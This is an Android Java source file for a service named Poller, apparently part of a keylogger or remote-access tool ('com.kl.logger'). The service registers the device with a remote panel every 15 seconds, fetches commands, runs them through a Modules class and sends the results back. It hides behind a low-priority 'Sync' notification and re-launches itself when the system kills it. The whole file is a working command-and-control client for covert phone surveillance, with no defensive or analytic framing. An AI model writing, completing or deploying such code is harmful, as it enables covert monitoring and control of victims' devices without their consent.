package com.kl.logger;

import android.app.*;
import android.content.*;
import android.os.*;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * Foreground service que registra o dispositivo e faz polling a cada 15 s.
 * Recebe comandos do painel e os despacha para Modules.run().
 */
public class Poller extends Service {

    private static final long TICK_MS = 15_000L;
    private static final String CH_ID  = "sync_ch";
    private static final int    NOTIF  = 1;

    private Handler   handler;
    private Runnable  loop;

    // ---- lifecycle --------------------------------------------------------

    public static void start(Context c) {
        Intent i = new Intent(c, Poller.class);
        c.startForegroundService(i);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        buildForeground();

        handler = new Handler(Looper.getMainLooper());
        loop = new Runnable() {
            @Override public void run() {
                new Thread(Poller.this::work).start();
                handler.postDelayed(this, TICK_MS);
            }
        };
        handler.post(loop);
    }

    @Override public int onStartCommand(Intent i, int f, int s) { return START_STICKY; }
    @Override public IBinder onBind(Intent i)                   { return null; }

    @Override
    public void onDestroy() {
        if (handler != null) handler.removeCallbacks(loop);
        super.onDestroy();
        // reagendar no caso de kill pelo sistema
        Intent i = new Intent(this, BootReceiver.class);
        i.setAction("com.kl.logger.RESTART");
        sendBroadcast(i);
    }

    // ---- core loop --------------------------------------------------------

    private void work() {
        try {
            String id  = Api.id(this);
            JSONObject reg = Device.info(this, id);
            Api.call("/api/reg", reg, "POST");

            JSONObject pollBody = new JSONObject().put("id", id);
            String raw = Api.call("/api/poll", pollBody, "POST");
            if (raw == null) return;

            JSONObject resp = new JSONObject(raw);
            JSONArray  cmds = resp.optJSONArray("cmds");
            if (cmds == null || cmds.length() == 0) return;

            for (int i = 0; i < cmds.length(); i++) {
                JSONObject item = cmds.getJSONObject(i);
                String cmd = item.optString("cmd");
                String arg = item.optString("arg", "");
                try {
                    String out = Modules.run(this, cmd, arg);
                    if (out != null) Api.res(this, cmd, out);
                } catch (Exception e) {
                    Api.res(this, cmd, "erro: " + e.getMessage());
                }
            }

        } catch (Exception ignored) {}
    }

    // ---- notification -----------------------------------------------------

    private void buildForeground() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm.getNotificationChannel(CH_ID) == null) {
            NotificationChannel ch = new NotificationChannel(CH_ID, "Sync", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
        }
        Notification n = new Notification.Builder(this, CH_ID)
                .setContentTitle("Sincronizando")
                .setContentText("Serviço ativo")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setOngoing(true)
                .build();
        startForeground(NOTIF, n);
    }
}
